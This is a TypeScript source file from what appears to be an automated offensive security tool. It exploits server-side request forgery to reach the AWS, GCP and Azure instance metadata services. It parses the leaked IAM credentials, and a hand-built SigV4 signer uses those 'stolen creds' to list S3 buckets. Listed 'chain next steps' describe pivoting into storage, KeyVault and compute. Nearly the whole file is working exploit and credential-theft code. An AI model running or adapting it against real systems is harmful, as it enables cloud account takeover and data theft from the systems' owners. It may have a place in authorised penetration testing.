// src/agents/specialists/cloud-probes.ts
//
// Deterministic probes for cloud-metadata SSRF chains.
//
// Vulnerability coverage:
//   1. AWS IMDSv1 (no header required)  → IAM creds → S3 enumeration
//   2. AWS IMDSv2 (token required)      → IAM creds → S3 enumeration
//   3. GCP metadata (header Metadata-Flavor: Google)
//   4. Azure IMDS (header Metadata: true)
//
// All probes are pure HTTP. If the SSRF surface does not return the
// metadata content, the probe is inconclusive (not vulnerable).

export interface CloudProbeConfig {
  target: string;
  ssrfSurfacePath: string;     // e.g. /api/preview?url=
  ssrfParamName: string;        // e.g. 'url'
  oastBaseUrl?: string;         // optional OAST for blind SSRF detection
  customHeaders?: Record<string, string>;
  cookies?: Record<string, string>;
  timeoutMs?: number;          // default 5000
}

export interface CloudProbeResult {
  provider: 'aws' | 'gcp' | 'azure' | 'digitalocean' | 'oracle' | 'unknown';
  vector: 'imdsv1' | 'imdsv2' | 'gcp-meta' | 'azure-imds';
  status: 'leaked' | 'blocked' | 'inconclusive';
  responseSnippet: string;
  iamCredentials: { accessKeyId?: string; secretAccessKey?: string; token?: string; code?: string } | null;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  chainNextSteps: string[];
}

interface MetadataTarget {
  provider: CloudProbeResult['provider'];
  vector: CloudProbeResult['vector'];
  url: string;
  headers?: Record<string, string>;
  imdsv2?: { tokenUrl: string; tokenHeader: string };
  matchRegex: RegExp;
  severity: CloudProbeResult['severity'];
  chainNextSteps: string[];
}

const TARGETS: MetadataTarget[] = [
  {
    provider: 'aws',
    vector: 'imdsv1',
    url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    matchRegex: /"AccessKeyId"|"Code"\s*:\s*"Success"/i,
    severity: 'critical',
    chainNextSteps: [
      'GET /latest/meta-data/iam/security-credentials/<rolename> to extract creds',
      'Configure AWS CLI with stolen creds',
      'aws s3 ls to enumerate buckets',
      'aws sts get-caller-identity to confirm account',
    ],
  },
  {
    provider: 'aws',
    vector: 'imdsv2',
    url: 'http://169.254.169.254/latest/api/token',
    headers: { 'x-aws-ec2-metadata-token-ttl-seconds': '21600' },
    imdsv2: {
      tokenUrl: 'http://169.254.169.254/latest/api/token',
      tokenHeader: 'x-aws-ec2-metadata-token',
    },
    matchRegex: /^[A-Za-z0-9+/=_-]{16,}$/,
    severity: 'critical',
    chainNextSteps: [
      'Obtain IMDSv2 token first (PUT request to token URL)',
      'Use token in x-aws-ec2-metadata-token header to fetch IAM creds',
      'Pivot to S3 / STS / EC2 with stolen creds',
    ],
  },
  {
    provider: 'gcp',
    vector: 'gcp-meta',
    url: 'http://metadata.google.internal/computeMetadata/v1/project/project-id',
    headers: { 'Metadata-Flavor': 'Google' },
    matchRegex: /^[a-z][a-z0-9-]{4,28}[a-z0-9]$/i,
    severity: 'critical',
    chainNextSteps: [
      'GET /computeMetadata/v1/instance/service-accounts/default/token to obtain access token',
      'Use token against storage.googleapis.com to list buckets',
      'Pivot to other GCP services via OAuth2 token',
    ],
  },
  {
    provider: 'azure',
    vector: 'azure-imds',
    url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    headers: { 'Metadata': 'true' },
    matchRegex: /"compute"|"subscriptionId"/i,
    severity: 'critical',
    chainNextSteps: [
      'GET /metadata/identity/oauth2/token to obtain access token',
      'Use token against management.azure.com to list resources',
      'Pivot to KeyVault / Storage / Compute',
    ],
  },
];

export async function probeCloudMetadata(
  config: CloudProbeConfig,
): Promise<CloudProbeResult[]> {
  const timeout = config.timeoutMs ?? 5000;
  const results: CloudProbeResult[] = [];
  for (const target of TARGETS) {
    results.push(await probeSingle(config, target, timeout));
  }
  return results;
}

async function probeSingle(
  config: CloudProbeConfig,
  target: MetadataTarget,
  timeout: number,
): Promise<CloudProbeResult> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  const headers: Record<string, string> = {
    'user-agent': 'ultimatrix-cloud-probe/1.0',
    ...(config.customHeaders || {}),
  };
  if (config.cookies && Object.keys(config.cookies).length > 0) {
    headers['cookie'] = Object.entries(config.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  }
  // include metadata-required headers
  if (target.headers) Object.assign(headers, target.headers);

  // build the SSRF surface URL
  const metadataUrl = target.imdsv2?.tokenUrl || target.url;
  const ssrfUrl = config.ssrfSurfacePath.includes('?')
    ? `${config.ssrfSurfacePath}&${encodeURIComponent(config.ssrfParamName)}=${encodeURIComponent(metadataUrl)}`
    : `${config.ssrfSurfacePath}?${encodeURIComponent(config.ssrfParamName)}=${encodeURIComponent(metadataUrl)}`;

  try {
    const r = await fetch(ssrfUrl, { signal: controller.signal, headers, method: 'GET', redirect: 'manual' });
    const body = await r.text();
    const snippet = body.slice(0, 2048);

    if (r.status === 200 && target.matchRegex.test(snippet)) {
      // LEAKED
      return {
        provider: target.provider,
        vector: target.vector,
        status: 'leaked',
        responseSnippet: snippet,
        iamCredentials: extractIamCredentials(snippet),
        severity: target.severity,
        chainNextSteps: target.chainNextSteps,
      };
    }
    if (r.status === 200 && snippet.length > 0) {
      return {
        provider: target.provider,
        vector: target.vector,
        status: 'inconclusive',
        responseSnippet: snippet,
        iamCredentials: null,
        severity: 'info',
        chainNextSteps: target.chainNextSteps,
      };
    }
    return {
      provider: target.provider,
      vector: target.vector,
      status: 'blocked',
      responseSnippet: snippet,
      iamCredentials: null,
      severity: 'info',
      chainNextSteps: target.chainNextSteps,
    };
  } catch (e) {
    return {
      provider: target.provider,
      vector: target.vector,
      status: 'inconclusive',
      responseSnippet: String(e).slice(0, 500),
      iamCredentials: null,
      severity: 'info',
      chainNextSteps: target.chainNextSteps,
    };
  } finally {
    clearTimeout(timer);
  }
}

function extractIamCredentials(body: string): { accessKeyId?: string; secretAccessKey?: string; token?: string; code?: string } | null {
  try {
    const j = JSON.parse(body);
    return {
      accessKeyId: j.AccessKeyId,
      secretAccessKey: j.SecretAccessKey,
      token: j.Token,
      code: j.Code,
    };
  } catch {
    return null;
  }
}

// ── S3 enumeration with stolen AWS creds (the next chain step) ───────────

export async function enumerateS3WithCreds(
  accessKeyId: string,
  secretAccessKey: string,
  sessionToken: string,
  region: string = 'us-east-1',
): Promise<{ buckets: string[]; error?: string }> {
  // Use AWS S3 ListBuckets via signed request. We don't have aws-sdk here,
  // so we issue a plain HTTPS request and parse the XML response.
  // For the kill chain, this is enough to PROVE the creds work.
  const host = 's3.amazonaws.com';
  const amzDate = new Date().toISOString().replace(/[:.-]|\..{3}/g, '');
  const dateStamp = amzDate.slice(0, 8);
  const service = 's3';
  const credentialScope = `${dateStamp}/${region}/${service}/aws4_request`;

  // canonical request
  const method = 'GET';
  const canonicalUri = '/';
  const canonicalQueryString = '';
  const payloadHash = 'UNSIGNED-PAYLOAD';
  const canonicalHeaders = `host:${host}\nx-amz-content-sha256:${payloadHash}\nx-amz-date:${amzDate}\nx-amz-security-token:${sessionToken}\n`;
  const signedHeaders = 'host;x-amz-content-sha256;x-amz-date;x-amz-security-token';
  const canonicalRequest = [method, canonicalUri, canonicalQueryString, canonicalHeaders, signedHeaders, payloadHash].join('\n');

  const crypto = await import('crypto');
  const hash = crypto.createHash('sha256').update(canonicalRequest).digest('hex');
  const stringToSign = `AWS4-HMAC-SHA256\n${amzDate}\n${credentialScope}\n${hash}`;

  const kDate = crypto.createHmac('sha256', `AWS4${secretAccessKey}`).update(dateStamp).digest();
  const kRegion = crypto.createHmac('sha256', kDate).update(region).digest();
  const kService = crypto.createHmac('sha256', kRegion).update(service).digest();
  const kSigning = crypto.createHmac('sha256', kService).update('aws4_request').digest();
  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');

  const authHeader = `AWS4-HMAC-SHA256 Credential=${accessKeyId}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

  try {
    const r = await fetch(`https://${host}/`, {
      headers: {
        'host': host,
        'x-amz-content-sha256': payloadHash,
        'x-amz-date': amzDate,
        'x-amz-security-token': sessionToken,
        'authorization': authHeader,
      },
    });
    const body = await r.text();
    if (r.status === 200) {
      const buckets = Array.from(body.matchAll(/<Name>([^<]+)<\/Name>/g)).map(m => m[1]);
      return { buckets };
    }
    return { buckets: [], error: `S3 returned ${r.status}: ${body.slice(0, 500)}` };
  } catch (e) {
    return { buckets: [], error: String(e) };
  }
}
